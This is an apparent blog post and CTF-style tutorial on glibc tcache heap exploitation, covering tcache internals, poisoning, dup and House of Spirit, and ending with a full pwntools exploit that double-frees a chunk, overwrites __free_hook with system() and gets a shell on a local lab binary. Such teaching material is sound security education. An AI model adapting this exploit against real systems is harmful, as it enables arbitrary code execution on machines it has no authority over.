<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>karimmuya | GLIBC Heap Exploitation: The Tcache </title>
  <meta name="description" content="Exploring GLIBC Heap tcache exploitation techniques.">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="GLIBC Heap Exploitation: The Tcache ">
  <meta property="og:type" content="website">
  <meta property="og:url" content="http://localhost:4000/2022/04/10/exploiting_tcaches.html">
  <meta property="og:description" content="Exploring GLIBC Heap tcache exploitation techniques.">
  <meta property="og:site_name" content="karimmuya">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="http://localhost:4000/2022/04/10/exploiting_tcaches.html">
  <meta name="twitter:title" content="GLIBC Heap Exploitation: The Tcache ">
  <meta name="twitter:description" content="Exploring GLIBC Heap tcache exploitation techniques.">

  
    <meta property="og:image" content="http://localhost:4000/assets/kareem-95b7e0a1de92e2614f6a9e1b3f79c4ab31d0e8ef0914149fe35d60c8cceb1d0a.png">
    <meta name="twitter:image" content="http://localhost:4000/assets/kareem-95b7e0a1de92e2614f6a9e1b3f79c4ab31d0e8ef0914149fe35d60c8cceb1d0a.png">
  

  <link href="http://localhost:4000/feed.xml" type="application/rss+xml" rel="alternate" title="karimmuya Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/kareem-95b7e0a1de92e2614f6a9e1b3f79c4ab31d0e8ef0914149fe35d60c8cceb1d0a.png">
      <link rel="apple-touch-icon" href="/assets/kareem-95b7e0a1de92e2614f6a9e1b3f79c4ab31d0e8ef0914149fe35d60c8cceb1d0a.png">
      <link rel="stylesheet" type="text/css" href="/assets/dark-184d8d73471417d11a28210fa9372e6bc5179405b2907557ed642901aba59391.css">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="karimmuya">karimmuya</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/KarimMuya" rel="noreferrer noopener" target="_blank" title="Twitter">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
</svg>

        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://github.com/karimmuya" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:kerimmuya@gmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
    
  </ul>
</nav>



        <article class="article scrollappear">
          <header class="article-header">
            <h1>GLIBC Heap Exploitation: The Tcache </h1>
            <p>Exploring GLIBC Heap tcache exploitation techniques.</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    April 10, 2022
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      8 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/ctf" title="See all posts with tag 'ctf'">ctf</a>
    
      
      <a href="/tag/binary_exploitation" title="See all posts with tag 'binary exploitation'">binary exploitation</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <h3 id="introduction-to-tcache">Introduction to Tcache</h3>

<p>Tcahce (thread local caching) is a new heap caching mechanism introduced in glibc 2.26 back in 2017. Tcache offers significant performance gains by creating per-thread caches for chunks up to a certain size. The malloc algorithms will first look into tcache bins before traversing fast, small, large or unsorted bins, whenever a chunk is allocated or freed.</p>

<p>I will be referring to the source code of <code class="highlighter-rouge">malloc.c</code> from glibc 2.26. In this version two new data structures were added in this version <code class="highlighter-rouge">tcache_perthread_struct</code> and <code class="highlighter-rouge">tcache_entry</code> as shown below:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>


<span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>
</code></pre></div></div>

<p><br />
Two functions are added to modern libc for tcache management: <code class="highlighter-rouge">tcache_put</code> and <code class="highlighter-rouge">tcache_get</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
<span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><br /></p>

<ul>
  <li><code class="highlighter-rouge">tcache_get</code> is similar to <code class="highlighter-rouge">__int_malloc</code>, which returns an available chunk to the application. This chunk will come out of the tcache bin.</li>
  <li><code class="highlighter-rouge">tcache_put</code> is similar to <code class="highlighter-rouge">__int_free</code>, which puts the chunk currently being freed into the tcache bin.</li>
  <li>The <code class="highlighter-rouge">tcachebins</code> behave similarly to <code class="highlighter-rouge">fastbins</code>, with each acting as the head of a singly linked, non-circular list of chunks of a specific size..</li>
  <li>There are 64 singly-linked bins per thread by default. A single tcache bin contains at most 7 chunks by default</li>
</ul>

<h3 id="tcache-exploitation-techniques">Tcache exploitation techniques</h3>

<h5 id="1-tcache-poisoning">1. tcache poisoning</h5>

<p>Tcache poisoning is a use after free vulnerability. To trigger this vulnerability We need an allocation, a deallocation, and be able to write to the freed chunk. This will be the address we desire to return into. Then finally the next allocations will cause malloc to return to the desired address. We now have an arbitrary write and we can gain arbitrary code execution.
Here is an example of tcache poisoning from example from shellphish’s <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c">how2heap</a></p>

<h5 id="2-tcache-dup">2. tcache dup</h5>

<p>This is done by tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist. Unlike fastbin dup, we do not need allocation in between, this allows us to allocate and free twice. The next allocations will be duplicated, and by writing to it and performing more allocations we may trick malloc into returning into a region of our own choosing.
Here is an example of tcache duplication from example from shellphish’s <a href="https://github.com/shellphish/how2heap/blob/master/obsolete/glibc_2.27/tcache_dup.c">how2heap</a></p>

<h5 id="3-tcache-house-of-spirit">3. tcache House of Spirit</h5>

<p>The exploit works similar to the normal house of spirit, the main difference being that the fake chunk is placed on the tcache, not the fastbin. As a result of this we can omit the size field from the second fake chunk since the sanity check present on the fastbin is not implemented on the tcache.
Here is an example of tcache House of Spirit from example from shellphish’s <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_house_of_spirit.c">how2heap</a></p>

<h3 id="demo---tcache-dup-">Demo  ( tcache dup )</h3>

<p>We will demonstrate tcache exploitation using <code class="highlighter-rouge">tcache dup</code> technique on a vulnerable binary running on <code class="highlighter-rouge">libc-2.31.so</code></p>

<p>Analysing the binary:</p>

<div class="language-s highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Arch</span><span class="o">:</span><span class="w">     </span><span class="n">amd64</span><span class="m">-64</span><span class="o">-</span><span class="n">little</span><span class="w">
</span><span class="n">RELRO</span><span class="o">:</span><span class="w">    </span><span class="n">Full</span><span class="w"> </span><span class="n">RELRO</span><span class="w">
</span><span class="n">Stack</span><span class="o">:</span><span class="w">    </span><span class="n">Canary</span><span class="w"> </span><span class="n">found</span><span class="w">
</span><span class="n">NX</span><span class="o">:</span><span class="w">       </span><span class="n">NX</span><span class="w"> </span><span class="n">enabled</span><span class="w">
</span><span class="n">PIE</span><span class="o">:</span><span class="w">      </span><span class="n">No</span><span class="w"> </span><span class="n">PIE</span><span class="w"> </span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<p>Running and testing the binary:</p>

<div class="language-s highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">()</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="mh">0x7f485a064bc0</span><span class="w">

</span><span class="m">1</span><span class="p">)</span><span class="w"> </span><span class="n">add</span><span class="w">
</span><span class="m">2</span><span class="p">)</span><span class="w"> </span><span class="n">free</span><span class="w">
</span><span class="m">3</span><span class="p">)</span><span class="w"> </span><span class="n">show</span><span class="w">
</span><span class="m">4</span><span class="p">)</span><span class="w"> </span><span class="n">exit</span><span class="w">
</span><span class="o">&gt;</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<p>We can see from the beginning we already have libc leaked, so we don’t even need to worry about that besides that we have 4 options we can add, free, show and exit.</p>

<p>To demonstrate, let’s prepare some helper functions for add and free:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">count</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"count: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

</code></pre></div></div>

<p><br /></p>

<p>Add 7 chunks of 0x50 size.
<br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>Add a temp chunk for duplicate.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">temp</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>Free the 7 0x50 chunks to fill the <code class="highlighter-rouge">tcachebin</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>Free the temp chunk so that it get added into 0x50 <code class="highlighter-rouge">fastbin</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>Add another 7 chunks of 0x50 so that freed chunks from <code class="highlighter-rouge">tcachebin</code> are consumed. Use this opportunity to write the <code class="highlighter-rouge">/bin/sh</code> string into a chunk that can be freed later.</p>

<p><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p><code class="highlighter-rouge">Double free</code> the temp chunk into the 0x50 <code class="highlighter-rouge">tcachebin</code>.</p>

<p><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>The next add request for a 0x50 size comes from the 0x50 tcachebin by the temp chunk. Request it, then overwrite its <code class="highlighter-rouge">fastbin</code> <code class="highlighter-rouge">fd</code>, pointing it near to the free hook. The fd of the fake chunk overlapping the <code class="highlighter-rouge">free hook</code> must be null.</p>

<p><br /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
</code></pre></div></div>

<p><br /></p>

<p>The next request for a 0x50 sized chunk comes from the 0x50 <code class="highlighter-rouge">fastbin</code> by the temp chunk. The tcache code will dump any remaining chunks from the 0x50 <code class="highlighter-rouge">fastbin</code> into the 0x50 <code class="highlighter-rouge">tcachebin</code>, including the fake chunk.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<p>The next request for a 0x50 sized chunk comes from the 0x50 <code class="highlighter-rouge">tcachebin</code> by the fake chunk that overlaps the <code class="highlighter-rouge">free hook</code>. Request it to overwrite the <code class="highlighter-rouge">free hook</code> with the address of <code class="highlighter-rouge">system()</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
</code></pre></div></div>

<p><br /></p>

<p>Free a chunk containing the <code class="highlighter-rouge">/bin/sh</code> string to trigger <code class="highlighter-rouge">system("/bin/sh")</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<p>Putting it all together: <code class="highlighter-rouge">exploit.py</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="nb">bin</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"tcache"</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="nb">bin</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">.</span><span class="n">libc</span>


<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">count</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">count</span> <span class="o">-</span> <span class="mi">1</span>


<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">count</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"count: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>


<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">temp</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">temp</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
<span class="n">free</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br /></p>

<div class="language-s highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">karim</span><span class="o">@</span><span class="n">karim</span><span class="w"> </span><span class="n">tcache</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">exploit.py</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="s1">'/home/karim/Documents/Heap/tcache/tcache'</span><span class="w">
    </span><span class="n">Arch</span><span class="o">:</span><span class="w">     </span><span class="n">amd64</span><span class="m">-64</span><span class="o">-</span><span class="n">little</span><span class="w">
    </span><span class="n">RELRO</span><span class="o">:</span><span class="w">    </span><span class="n">Full</span><span class="w"> </span><span class="n">RELRO</span><span class="w">
    </span><span class="n">Stack</span><span class="o">:</span><span class="w">    </span><span class="n">Canary</span><span class="w"> </span><span class="n">found</span><span class="w">
    </span><span class="n">NX</span><span class="o">:</span><span class="w">       </span><span class="n">NX</span><span class="w"> </span><span class="n">enabled</span><span class="w">
    </span><span class="n">PIE</span><span class="o">:</span><span class="w">      </span><span class="n">No</span><span class="w"> </span><span class="n">PIE</span><span class="w"> </span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="w">
    </span><span class="n">RUNPATH</span><span class="o">:</span><span class="w">  </span><span class="s1">'./'</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">interactive</span><span class="w"> </span><span class="n">mode</span><span class="w">
</span><span class="o">$</span><span class="n">id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="m">1000</span><span class="p">(</span><span class="n">karim</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="m">984</span><span class="p">(</span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="m">984</span><span class="p">(</span><span class="n">users</span><span class="p">),</span><span class="m">108</span><span class="p">(</span><span class="n">vboxusers</span><span class="p">),</span><span class="m">998</span><span class="p">(</span><span class="n">wheel</span><span class="p">),</span><span class="m">1000</span><span class="p">(</span><span class="n">flutterusers</span><span class="p">)</span><span class="w">
</span><span class="o">$</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<h5 id="reference">Reference</h5>

<ul>
  <li><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></li>
</ul>

          </div>
          

          
        </article>
        <footer class="footer scrollappear">
  <p style="text-align: center">
    __call_tls_dtors() <br>
    © 2022  
    
  </p>
</footer>

      </div>
    </div>
  </main>
  

<script type="text/javascript" src="/assets/vendor-734ddaa553ebf4e6ca703bd7c567ef4a0e43b0ba799607355e56b81e88781318.js"></script>


  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>



  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>


<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>


</body>
</html>
